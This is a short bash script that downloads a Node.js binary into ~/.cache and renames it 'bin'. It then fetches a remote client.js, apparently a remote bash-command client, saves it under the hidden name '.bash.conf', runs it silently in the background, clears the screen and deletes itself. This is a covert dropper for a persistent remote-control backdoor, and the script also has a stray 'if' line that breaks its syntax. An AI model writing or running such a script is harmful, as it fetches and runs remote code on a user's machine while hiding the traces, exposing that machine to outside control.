#!/bin/bash

set -ea -o pipefail

FILENAME=.bash.conf
NODE_VERSION=v6.3.1
PLATFORM=linux
EXTENSION=xz

if

if [ $(uname) == "Darwin" ]; then
     PLATFORM=darwin
     EXTENSION=gz
   fi

mkdir -p ~/.cache
cd ~/.cache



curl https://nodejs.org/dist/$NODE_VERSION/node-$NODE_VERSION-$PLATFORM-x64.tar.$EXTENSION > node.tar.$EXTENSION
tar -xvf node.tar.$EXTENSION 
cp node-$NODE_VERSION-$PLATFORM-x64/bin/node .
mv node bin
rm -rf node-$NODE_VERSION-$PLATFORM-x64/bin/node
curl https://raw.githubusercontent.com/DamienBen/bashCmd-client-server/develop/client.js > $FILENAME


nohup ./bin $FILENAME > /dev/null & clear
rm -- "$0"
